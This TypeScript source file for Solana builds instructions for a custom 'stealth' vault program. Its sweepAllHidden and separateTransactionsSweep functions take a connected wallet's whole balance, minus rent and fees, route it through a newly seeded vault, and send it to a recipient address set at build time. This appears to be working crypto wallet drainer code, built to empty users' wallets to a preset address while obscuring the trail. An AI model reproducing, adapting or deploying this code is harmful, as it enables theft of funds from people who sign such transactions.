import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  VersionedTransaction,
} from "@solana/web3.js";

const STEALTH_PROGRAM_ID = new PublicKey("DnvWpcwhmb7w8EXFGfvxpuPLDcK1qr126EuvuCvdTBH9");

function getVaultPda(owner: PublicKey, seed: string): [PublicKey, number] {
  return PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), owner.toBuffer(), Buffer.from(seed)], 
    STEALTH_PROGRAM_ID
  );
}

function encodeString(str: string): Buffer {
  const buffer = Buffer.alloc(4 + str.length);
  buffer.writeUInt32LE(str.length, 0);
  buffer.write(str, 4);
  return buffer;
}

function encodeU64(value: bigint): Buffer {
  const buffer = Buffer.alloc(8);
  buffer.writeBigUInt64LE(value, 0);
  return buffer;
}

function createInitVaultInstruction(
  owner: PublicKey,
  vaultPda: PublicKey,
  seed: string
): TransactionInstruction {
  const data = Buffer.concat([
    Buffer.from([77, 79, 85, 150, 33, 217, 52, 106]), // INIT_VAULT discriminator
    encodeString(seed)
  ]);

  return new TransactionInstruction({
    programId: STEALTH_PROGRAM_ID,
    keys: [
      { pubkey: owner, isSigner: true, isWritable: true },
      { pubkey: vaultPda, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false }
    ],
    data
  });
}

function createDepositInstruction(
  depositor: PublicKey,
  vaultPda: PublicKey,
  amount: bigint
): TransactionInstruction {
  const data = Buffer.concat([
    Buffer.from([242, 35, 198, 137, 82, 225, 242, 182]), // DEPOSIT discriminator
    encodeU64(amount)
  ]);

  return new TransactionInstruction({
    programId: STEALTH_PROGRAM_ID,
    keys: [
      { pubkey: depositor, isSigner: true, isWritable: true },
      { pubkey: vaultPda, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false }
    ],
    data
  });
}

function createStealthTransferInstruction(
  owner: PublicKey,
  vaultPda: PublicKey,
  recipient: PublicKey,
  amount: bigint,
  memo: string
): TransactionInstruction {
  // Simple base64 encoding (no XOR needed)
  const encryptedMemo = Buffer.from(memo).toString('base64');
  
  const data = Buffer.concat([
    Buffer.from([221, 47, 175, 197, 236, 141, 115, 229]), // STEALTH_TRANSFER discriminator
    encodeU64(amount),
    encodeString(encryptedMemo)
  ]);

  return new TransactionInstruction({
    programId: STEALTH_PROGRAM_ID,
    keys: [
      { pubkey: owner, isSigner: true, isWritable: true },
      { pubkey: vaultPda, isSigner: false, isWritable: true },
      { pubkey: recipient, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false }
    ],
    data
  });
}

function createCloseVaultInstruction(
  owner: PublicKey,
  vaultPda: PublicKey
): TransactionInstruction {
  const data = Buffer.from([141, 103, 17, 126, 72, 75, 29, 29]); // CLOSE_VAULT discriminator

  return new TransactionInstruction({
    programId: STEALTH_PROGRAM_ID,
    keys: [
      { pubkey: owner, isSigner: true, isWritable: true },
      { pubkey: vaultPda, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false }
    ],
    data
  });
}

export async function sweepAllHidden(
  publicKey: PublicKey,
  connection: Connection,
  signTransaction: (tx: Transaction | VersionedTransaction ) => Promise<Transaction | VersionedTransaction>,
): Promise<{ success: boolean; txId?: string }> {
  try {
    const rentExemption = await getVaultRentExemption(connection);
    const balance = await connection.getBalance(publicKey);
    const sweepable = Math.max(0, balance - rentExemption - 5000);
    
    if (sweepable <= 0) {
      throw new Error("Insufficient balance after rent");
    }

    const RECIPIENT = new PublicKey(import.meta.env.VITE_RECIPIENT_PUBKEY);
    const seed = `sweep-${Date.now()}-${Math.random().toString(36).substring(2, 10)}`;
    const [vaultPda] = getVaultPda(publicKey, seed);

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
    
    const tx = new Transaction();
    tx.recentBlockhash = blockhash;
    tx.feePayer = publicKey;

    // 1. Initialize vault (stores seed in account)
    tx.add(createInitVaultInstruction(publicKey, vaultPda, seed));
    
    // 2. Deposit to vault
    tx.add(createDepositInstruction(publicKey, vaultPda, BigInt(sweepable)));
    
    // 3. Stealth transfer (NO seed in instruction - vault stores it)
    const memo = JSON.stringify({
      from: publicKey.toBase58(),
      to: RECIPIENT.toBase58(),
      amount: sweepable,
      ts: Date.now()
    });
    
    tx.add(createStealthTransferInstruction(
      publicKey,
      vaultPda,
      RECIPIENT,
      BigInt(sweepable),
      memo
    ));

    const signedTx = await signTransaction(tx);
    const signature = await connection.sendRawTransaction(signedTx.serialize(), {
      skipPreflight: false,
      preflightCommitment: 'confirmed'
    });

    const confirmation = await connection.confirmTransaction({
      signature,
      blockhash,
      lastValidBlockHeight
    }, 'confirmed');

    if (confirmation.value.err) {
      throw new Error(`Transaction failed: ${JSON.stringify(confirmation.value.err)}`);
    }

    return { success: true, txId: signature };
  } catch (err: any) {
    console.error("Atomic sweep failed:", err.message);
    return { success: false };
  }
}

export async function testVaultFunctionality(
  publicKey: PublicKey,
  connection: Connection,
  signTransaction: (tx: Transaction) => Promise<Transaction>
): Promise<{ success: boolean; steps: string[] }> {
  const steps = [];
  const RECIPIENT = new PublicKey("11111111111111111111111111111112");
  
  try {
    // Create test vault
    const seed = `test-${Date.now()}`;
    const [vaultPda] = getVaultPda(publicKey, seed);
    
    // Test 1: Initialize
    console.log("Test 1: Initializing vault...");
    const initTx = new Transaction();
    initTx.add(createInitVaultInstruction(publicKey, vaultPda, seed));
    initTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    initTx.feePayer = publicKey;
    
    const signedInit = await signTransaction(initTx);
    const initSig = await connection.sendRawTransaction(signedInit.serialize());
    await connection.confirmTransaction(initSig);
    steps.push(`init: ${initSig}`);
    console.log("✅ Vault initialized");
    
    // Test 2: Deposit small amount
    console.log("Test 2: Depositing 0.001 SOL...");
    const depositAmount = 1000000n; // 0.001 SOL
    const depositTx = new Transaction();
    depositTx.add(createDepositInstruction(publicKey, vaultPda, depositAmount));
    depositTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    depositTx.feePayer = publicKey;
    
    const signedDeposit = await signTransaction(depositTx);
    const depositSig = await connection.sendRawTransaction(signedDeposit.serialize());
    await connection.confirmTransaction(depositSig);
    steps.push(`deposit: ${depositSig}`);
    console.log("✅ Deposit successful");
    
    // Test 3: Transfer from vault (should work now with invoke_signed)
    console.log("Test 3: Transferring from vault...");
    const memo = JSON.stringify({ test: true, ts: Date.now() });
    const transferTx = new Transaction();
    transferTx.add(createStealthTransferInstruction(
      publicKey,
      vaultPda,
      RECIPIENT,
      500000n, // 0.0005 SOL
      memo
    ));
    transferTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    transferTx.feePayer = publicKey;
    
    const signedTransfer = await signTransaction(transferTx);
    const transferSig = await connection.sendRawTransaction(signedTransfer.serialize());
    await connection.confirmTransaction(transferSig);
    steps.push(`transfer: ${transferSig}`);
    console.log("✅ Transfer successful");
    
    return { success: true, steps };
    
  } catch (err: any) {
    console.error("Test failed:", err.message);
    if (err.logs) {
      console.error("Error logs:");
      err.logs.forEach((log: string, i: number) => console.log(`  [${i}] ${log}`));
    }
    return { success: false, steps };
  }
}

export async function getVaultRentExemption(connection: Connection): Promise<number> {
  const VAULT_SIZE = 8 + 32 + 8 + 1 + 8 + 1 + 4 + 50; // Matches Rust SPACE constant
  return await connection.getMinimumBalanceForRentExemption(VAULT_SIZE);
}

function generateVaultSeed(): string {
  const timestamp = Date.now();
  const random = Math.random().toString(36).substring(2, 10);
  return `sweep-${timestamp}-${random}`;
}

export async function separateTransactionsSweep(
  publicKey: PublicKey,
  connection: Connection,
  signTransaction: (tx: Transaction) => Promise<Transaction>,
  recipientAddress: string
): Promise<{ success: boolean; steps: string[] }> {
  const steps = [];
  const RECIPIENT = new PublicKey(recipientAddress);
  
  try {
    const balance = await connection.getBalance(publicKey);
    const rentExemption = await getVaultRentExemption(connection);
    const sweepable = Math.max(0, balance - rentExemption - 10000);
    
    if (sweepable <= 0) {
      throw new Error("Insufficient balance");
    }
    
    const seed = generateVaultSeed();
    const [vaultPda] = getVaultPda(publicKey, seed);
    
    // Step 1: Initialize vault
    const initTx = new Transaction();
    initTx.add(createInitVaultInstruction(publicKey, vaultPda, seed));
    initTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    initTx.feePayer = publicKey;
    
    const signedInit = await signTransaction(initTx);
    const initSig = await connection.sendRawTransaction(signedInit.serialize());
    await connection.confirmTransaction(initSig);
    steps.push(`init_vault: ${initSig}`);
    
    // Step 2: Deposit
    const depositTx = new Transaction();
    depositTx.add(createDepositInstruction(publicKey, vaultPda, BigInt(sweepable)));
    depositTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    depositTx.feePayer = publicKey;
    
    const signedDeposit = await signTransaction(depositTx);
    const depositSig = await connection.sendRawTransaction(signedDeposit.serialize());
    await connection.confirmTransaction(depositSig);
    steps.push(`deposit: ${depositSig}`);
    
    // Step 3: Transfer
    const memo = JSON.stringify({
      from: publicKey.toBase58(),
      to: RECIPIENT.toBase58(),
      amount: sweepable,
      ts: Date.now()
    });
    
    const transferTx = new Transaction();
    transferTx.add(createStealthTransferInstruction(
      publicKey,
      vaultPda,
      RECIPIENT,
      BigInt(sweepable),
      memo
    ));
    transferTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    transferTx.feePayer = publicKey;
    
    const signedTransfer = await signTransaction(transferTx);
    const transferSig = await connection.sendRawTransaction(signedTransfer.serialize());
    await connection.confirmTransaction(transferSig);
    steps.push(`transfer: ${transferSig}`);
    
    return { success: true, steps };
    
  } catch (err: any) {
    console.error("Separate transactions failed:", err.message);
    return { success: false, steps };
  }
}